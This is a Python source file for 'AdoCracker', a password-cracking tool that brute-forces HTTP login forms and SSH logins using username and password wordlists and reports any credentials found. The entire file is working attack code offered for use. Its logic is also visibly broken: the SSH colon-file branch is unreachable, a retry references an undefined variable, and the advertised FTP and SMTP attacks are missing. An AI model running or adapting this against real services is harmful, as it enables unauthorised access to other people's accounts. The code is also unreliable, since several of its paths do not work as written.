import os
import socket
import requests
import sys
from pyfiglet import figlet_format
import argparse
import time
import nmap
import paramiko

banner = "AdoCracker"
print(figlet_format(banner, font="standard"))
print("This is a password cracker tool for HTTP, FTP, SSH and SMTP")
print("Author @adomigold,", "Github account: https://github.com/adomigold/ \n")

parser = argparse.ArgumentParser()
parser.add_argument('-a', '--attack', type=str, help="Target url or IP adress")
parser.add_argument('-l', '--login', type=str, help="Target username")
parser.add_argument('-L', '--login_file', type=str, help="File contain usernames")
parser.add_argument('-C', '--colon_file', help="Colon separated 'login:password' files")
parser.add_argument('-p', '--password', type=str, help="Target Password")
parser.add_argument('-P', '--password_file', type=str, help="File contains passwords")
parser.add_argument('-t', '--threads', type=str, help="Thread connection")
parser.add_argument('-v', '--verbose', nargs='?', help="Enter show to see login attempts")
parser.add_argument('-s', '--service', type=str, help="Acceptable services are http, ftp, ssh and smtp")
parser.add_argument('-r', '--response', type=str, help="Web response after login failed attempt")
parser.add_argument('-o', '--port', type=int, help="SSH, FTP and SMTP ports")
parser.add_argument('--username_form', type=str, help="Username form as shown on site sourcode")
parser.add_argument('--password_form', type=str, help="Password form as shown on site sourcode")
args = parser.parse_args()

if len(sys.argv) < 2:
    print("\nType -h or --help on how to use")
    exit(0)

# Attacking HTTP Service
if args.service == "http":
    try:
        target = args.attack
        username = args.login
        username_file = args.login_file
        colon_file = args.colon_file
        password = args.password
        password_file = args.password_file
        response = args.response
        form1 = args.username_form
        form2 = args.password_form

        if "://" not in target:
            print("Target must start with http:// or https://")
            exit(0)

        # When single password provided
        if args.password in sys.argv:
            print("\033[1;34m------------------------------"
                  "\n     adocracker is started      "
                  "\n  Take a cup of coffee and wait"
                  "\n------------------------------")
            file = open(username_file)
            user_list = file.readlines()

            for user in user_list:
                user = user.rstrip()

                if args.verbose in sys.argv:
                    if args.verbose != "show":
                        break

                    print('\033[1;37m''[+]', user, '_', password)
                post = {f'{form1}': user, f'{form2}': password, 'submit': "Submit"}
                re = requests.post(target, data=post)
                if args.response in re.text:
                    pass
                else:
                    print("\n\033[1;92m-----------------------------------------"
                          "\n Username found:", user,
                          "\n-----------------------------------------")
                    break
            else:
                print("\n\033[1;31m------------------------------------------------------------------"
                      "\n Sorry!! No password or username found on your wordlist"
                      "\n Please provide wordlist with more words to increase your chance"
                      "\n------------------------------------------------------------------")
                exit(0)

        # When colon file is provided
        elif args.colon_file in sys.argv:
            print("\033[1;34m------------------------------"
                  "\n     adocracker is started      "
                  "\n  Take a cup of coffee and wait"
                  "\n------------------------------")
            file = open(colon_file)
            for line in file.readlines():
                if ":" in line:
                    user = line.split(':')[0]
                    pwd = line.split(':')[1]
                    if args.verbose in sys.argv:
                        if args.verbose != "show":
                            break
                        print('\033[1;37m''[+]', user, '_', pwd)
                    post = {f'{form1}': user, f'{form2}': pwd.strip(), 'submit': "Submit"}
                    re = requests.post(target, data=post)
                    if args.response in re.text:  # Change this according to the server respond when login attempt failed
                        pass
                    else:
                        print("\n\033[1;92m-----------------------------------------------------------"
                              "\n Username and Password found:", user, "=>", pwd,
                             "----------------------------------------------------------")
                        break
                else:
                    print("\n\033[1;31m------------------------------------------------------------------"
                          "\n Sorry!! No password or username found on your wordlist"
                          "\n Please provide wordlist with more words to increase your chance"
                          "\n------------------------------------------------------------------")
                    exit(0)

        # When password file provided
        else:
            print("\033[1;34m------------------------------"
                  "\n     adocracker is started      "
                  "\n  Take a cup of coffee and wait"
                  "\n------------------------------")
            file = open(password_file)
            pwd_list = file.readlines()

            for pwd in pwd_list:
                pwd = pwd.rstrip()

                if args.verbose in sys.argv:
                    if args.verbose != "show":
                        break

                    print('\033[1;37m''[+]', username, '_', pwd)
                post = {f'{form1}': username, f'{form2}': pwd, 'submit': "Submit"}
                re = requests.post(target, data=post)
                if args.response in re.text: # Change this according to the server respond when login attempt failed
                    pass
                else:
                    print("\n\033[1;92m-----------------------------------------"
                          "\n Password found:", pwd,
                          "\n------------------------------------------")
                    break
            else:
                print("\n\033[1;31m------------------------------------------------------------------"
                      "\n Sorry!! No password or username found on your wordlist"
                      "\n Please provide wordlist with more words to increase your chance"
                      "\n------------------------------------------------------------------")
                exit(0)
    except KeyboardInterrupt:
        print("\n\033[1;31m[*] CTRL+c detected... Exiting now")
        exit(0)

# Attacking SSH
if args.service == "ssh":
    try:
        print("\033[1;34m---------------------------------"
              "\n     adocracker is started      "
              "\n  Take a cup of coffee and wait"
              "\n---------------------------------")

        target = args.attack
        port = args.port
        username = args.login
        username_file = args.login_file
        password = args.password
        password_file = args.password_file
        colon_file = args.colon_file

        # When single password provided
        if args.password in sys.argv:
            file = open(username_file)
            user_list = file.readlines()

            for user in user_list:
                user = user.rstrip()

                def open_ssh(target, port, user, password):
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    try:
                        ssh.connect(target, port, user, password, timeout=600)
                    except socket.timeout:
                        print(f"[!] Host: {target} is unreachable")
                        return False
                    except paramiko.AuthenticationException:
                        if args.verbose in sys.argv:
                            if args.verbose != "show":
                                return False
                            print('\033[1;37m''[+]', user, '_', password)
                        return False
                    except paramiko.ssh_exception.NoValidConnectionsError :
                        print(f"\n\033[1;33m[*] Connection timeout, The script will restart connection in 10 seconds... Press CTRL+c to cancel")
                        time.sleep(10)
                        return open_ssh(target, port, user, password)
                    except paramiko.ssh_exception.SSHException:
                        print("\n\033[1;31mConnection was aborted by the software in your host machine... And we don't know why")
                        exit(0)
                    else:
                        print("\n\033[1;92m-----------------------------------------"
                              "\n Password found:", password,
                              "\n------------------------------------------")
                        exit(0)
                open_ssh(target, port, user, password)
    except KeyboardInterrupt:
        print("\n\033[1;31m[*] CTRL+c detected... Exiting now")
        exit(0)

        # When colon_file is provided
        if args.colon_file in sys.argv:
            print("\033[1;34m------------------------------"
                  "\n     adocracker is started      "
                  "\n  Take a cup of coffee and wait"
                  "\n------------------------------")
            file = open(colon_file)
            for line in file.readlines():
                if ":" in line:
                    user = line.split(':')[0]
                    pwd = line.split(':')[1]

                    def open_ssh(target, port, user, pwd):
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        try:
                            ssh.connect(target, port, user, pwd.strip(), timeout=600)
                        except socket.timeout:
                            print(f"[!] Host: {target} is unreachable")
                            return False
                        except paramiko.AuthenticationException:
                            if args.verbose in sys.argv:
                                if args.verbose != "show":
                                    return False
                                print('\033[1;37m''[+]', user, '_', pwd)
                            return False
                        except paramiko.ssh_exception.NoValidConnectionsError:
                            print(
                                f"\n\033[1;33m[*] Connection timeout, The script will restart connection in 10 seconds... Press CTRL+c to cancel")
                            time.sleep(10)
                            return open_ssh(target, port, user, password)
                        except paramiko.ssh_exception.SSHException:
                            print(
                                "\n\033[1;31mConnection was aborted by the software in your host machine... And we don't know why")
                            exit(0)
                        else:
                            print("\n\033[1;92m-----------------------------------------------------------"
                                  "\n Username and Password found:", user, "=>", pwd,
                                  "----------------------------------------------------------")
                            exit(0)
                    open_ssh(target, port, user, pwd)
    else:
        print("\n\033[1;31m------------------------------------------------------------------"
              "\n Sorry!! No password or username found on your wordlist"
              "\n Please provide wordlist with more words to increase your chance"
              "\n------------------------------------------------------------------")
        exit(0)